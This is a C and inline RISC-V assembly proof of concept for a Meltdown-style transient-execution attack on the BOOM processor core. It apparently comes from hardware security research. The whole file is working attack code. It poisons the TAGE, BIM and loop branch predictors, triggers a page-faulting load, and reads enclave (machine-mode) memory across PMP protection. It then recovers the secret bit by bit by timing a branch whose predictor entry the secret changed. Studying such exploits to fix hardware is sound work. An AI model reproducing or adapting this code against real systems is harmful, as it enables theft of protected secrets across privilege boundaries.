/* New transient execution attack PoC on risc-v BOOM

   Boom incorrectly updates BIM entry when page-faulting load and branch instruction
   meet at a specific condition. On such case, BIM entry conflicting with load
   instruction is incorrectly updated and we can update it using transiently accessed
   secret value.

   This PoC shows a Meltdown type attack where supervisor-mode (kernel) retrieve secret
   from machin-mode (enclave) using the above vulnerability.
 */

#include <stdio.h>
#include <stdint.h>
#include "util.h"
#include "encoding.h"

extern uint8_t data[];
extern uint8_t secret[];

#define S_WORD 32

#define BIM_NSETS (2048)
#define BIM_BANKWIDTH (2)
#define BIM_SETSIZE (4 * 2)
#define BIM_SIZE (BIM_NSETS * BIM_SETSIZE)

// Used to locate an instruction at intended address
#define _nop(n)                              \
    asm volatile(".rept %0\n"                \
                 "nop\n"                     \
                 ".endr\n"                   \
                 : : "i"(n));

// Index of page-faulting load (and conflicting branch) in BIM table
#define BR_LD (27)
// Index of following branch in loop branch predictor (need for poisoning)
#define BR_EQZ (15)


// Poisoning tage branch predictor to minimize the noise
#define run_tage(i, N)                                                                    \
void run_tage##i(uint64_t r) __attribute__((section(".text.attack"), aligned(BIM_SIZE))); \
void run_tage##i(uint64_t r) {                                                            \
                                                                                          \
    _nop(N);                                                                              \
                                                                                          \
    asm volatile("csrr t3, cycle\n"                                                       \
                 "andi %0, %0, 1\n"                                                       \
                 "addi a1, %0, 0\n"                                                       \
                 "addi a0, zero, 0\n"                                                     \
                 : : "r"(r));                                                             \
    asm volatile("nop");                                                                  \
    asm volatile("beq a1, a0, 1f\n"                                                       \
                 "0: nop\n"                                                               \
                 "1: csrr t4, cycle\n");                                                  \
    return;                                                                               \
}


#define DUMMY (4 + 5)
#define N BR_LD * BIM_BANKWIDTH - DUMMY

run_tage(0, N)
run_tage(1, N)
run_tage(2, N)
run_tage(3, N)
run_tage(4, N)
run_tage(5, N)

#undef DUMMY
#undef N

void run_bim(uint64_t r) __attribute__((section(".text.attack"), aligned(BIM_SIZE)));
void run_loop(uint64_t r) __attribute__((section(".text.attack"), aligned(BIM_SIZE)));
uint64_t run_bim_cycle(void) __attribute__((section(".text.attack"), aligned(BIM_SIZE)));
void transient(uint64_t idx) __attribute__((section(".text.attack"), aligned(BIM_SIZE)));

// Poisoning the conflicting BIM entry to always taken
void run_bim(uint64_t r) {
#define DUMMY (4 + 5)
#define N BR_LD * BIM_BANKWIDTH - DUMMY

    _nop(N);

#undef DUMMY
#undef N

    asm volatile("andi %0, %0, 1\n"
                 "beqz %0, 1f\n"
                 "1:\n"
                 : : "r"(r));

    asm volatile("nop"); // Allocate at second bank
    asm volatile("addi a0, zero, 0\n"
                 "addi a1, zero, 1\n"
                 "bge a1, a0, 1f\n" // Conflicting branch
                 "0: j 0b\n"
                 "1: ");

    return;
}

// Measure the cycle for executng the conflicting branch
// Take longer time when branch is predicted to not taken (but it was taken)
uint64_t run_bim_cycle(void) {
    volatile uint64_t cycle;

#define DUMMY (11 + 3)

#define N BR_LD * BIM_BANKWIDTH - DUMMY
    _nop(N);
#undef N
#undef DUMMY

    asm volatile ("csrr t3, cycle\n"
                  "addi a0, zero, 0\n"
                  "addi a1, zero, 16\n"
                  "addi a2, zero, 2\n"
                  "fcvt.s.lu fa4, a1\n"
                  "fcvt.s.lu fa5, a2\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fcvt.lu.s a1, fa4\n");

    asm volatile ("nop"); // Allocate at second bank
    asm volatile ("bge a1, a0, 1f\n" // Conflicting branch
                  "0: j 0b\n"
                  "1: li a3, 16\n"
                  "fcvt.s.lu fa4, a3\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n"
                  "fdiv.s fa4, fa4, fa5\n");

    asm volatile ("csrr t4, cycle\n"
                  "sub %0, t4, t3\n"
                  : "=r"(cycle));

    return cycle;
}

// Poisoning loop branch predictor to minimize the noise
void run_loop(uint64_t r) {
#define DUMMY (6 + 5)
#define N BR_EQZ * BIM_BANKWIDTH - DUMMY

    _nop(N);

#undef DUMMY
#undef N

    asm volatile("nop");
    asm volatile("li a0, 10\n"
                 "1: addi a0, a0, -1\n"
                 "andi a1, %0, 1\n"
                 "srli %0, %0, 1\n"
                 "beqz a1, 0f\n"
                 "0:nop\n"
                 "bnez a0, 1b\n"
                 : : "r"(r));

    return;
}


#define poison_tage(R)                           \
    run_tage0(R);                                \
    R = lfsr(R);                                 \
    run_tage1(R);                                \
    R = lfsr(R);                                 \
    run_tage2(R);                                \
    R = lfsr(R);                                 \
    run_tage3(R);                                \
    R = lfsr(R);                                 \
    run_tage4(R);                                \
    R = lfsr(R);                                 \
    run_tage5(R);                                \
    R = lfsr(R);

#define poison_bim(R)                           \
    run_bim(R);                                 \
    R = lfsr(R);

#define poison_loop(R)                          \
    run_loop(R);                                \
    R = lfsr10(R);


// Execute
// 1. page-faulting load, 2. secret access over PMP protection, 3. branch using secret
// Control the enque cycle of the instruction so that the BOOM bug can be triggered.
// When the bug is triggered, BIM entry conflicting with the first load is updated to
// not-taken if secret is 1, else remain unchanged.
void transient(uint64_t idx) {
    // Flush all PTEs (for deterministic)
    asm volatile("sfence.vma zero, zero");

    // Flush all cache line conflicting with first load (for deterministic)
    asm volatile("la a1, conflict0 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict1 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict2 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict3 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict4 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict5 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict6 + 64\n"
                 "ld a2, 0(a1)\n"
                 "la a1, conflict7 + 64\n"
                 "ld a2, 0(a1)\n");

    asm volatile("fence\n");

    // Fetch PTE and cache line only for the secret address
    asm volatile("la gp, 1f\n"
                 "la a1, data1\n"
                 "la a4, secret\n"
                 "li a2, 256\n"
                 "li a3, 2\n"
                 "fcvt.s.lu fa4, a3\n"
                 "fcvt.s.lu fa5, a2\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fdiv.s    fa5, fa5, fa4\n"
                 "fcvt.lu.s a2, fa5\n"
                 "add a1, a1, a2\n"
                 "ld a2, 0(a1)\n"
                 "ld a3, 0(a4)\n"
                 "1: li gp, 0\n");

    asm volatile("fence\n");

    // Launch attack
    asm volatile("la gp, 1f\n"
                 "la a1, data0+64\n"
                 "la a2, secret\n"
                 "ld a3, 0(a1)\n" // Page-faulting load
                 "ld a4, 0(a2)\n" // Secret accessing load (over PMP protection)
                 "srl a4, a4, a0\n"
                 "andi a4, a4, 1\n"
                 "andi a4, a4, 1\n"
                 "andi a4, a4, 1\n"
                 "andi a4, a4, 1\n"
                 "andi a4, a4, 1\n"
                 "andi a4, a4, 1\n"
                 "beqz a4, 1f\n" // Branch depending on the secret
                 "nop\n"
                 "1: li gp, 0\n");

    return;
}

int main(void) {
    uint64_t sec = 0xdeadbeef;
    uint8_t bits[S_WORD] = {0,};
    uint8_t votes[S_WORD] = {0,};

    printf("[*] New transient execution attack on BOOM\n");

    volatile uint64_t random = ENTROPY;
    for (int idx = S_WORD - 1; idx >= 0; idx--) {
        printf("[%2d] Want(%d) Cycles: ", idx, (int) ((sec >> idx) & 1));
        uint64_t cycles[TRIAL] = {0, };
        for (int t = 0; t < TRIAL; t++) {
            for (int i = 0; i < 10; i++) {
                poison_tage(random);
            }

            for (int i = 0; i < 10; i++) {
                poison_bim(random);
            }

            for (int i = 0; i < 10; i++) {
                poison_loop(random);
            }

            for (int i = 0; i< 10; i++) {
                transient((uint64_t) idx);
            }

            // NOTE:
            //   If cycle > 200, secret = 1
            //   else          , secret = 0
            cycles[t] = run_bim_cycle();

            printf("%ld ", cycles[t]);
        }

        int sum = 0;
        for (int t = 0; t < TRIAL; t++) {
            if (cycles[t] > 200)
                sum++;
        }

        // We prioritize sum since BIM entry should not be updated at all when secret is 0
        bits[idx] = (sum >= TRIAL/2)? 1:0;
        votes[idx] = (sum >= TRIAL/2)? sum:TRIAL - sum;

        printf(" --> %d (%d/%d)\n", bits[idx], votes[idx], TRIAL);
    }

    printf("[*] Secret: 0x");
    for (int idx = S_WORD - 4; idx >= 0; idx-=4) {
        uint16_t hex = bits[idx+3] << 3 | bits[idx+2] << 2 | bits[idx+1] << 1 | bits[idx];
        printf("%x", hex);
    }
    printf("\n");

    return 0;
}
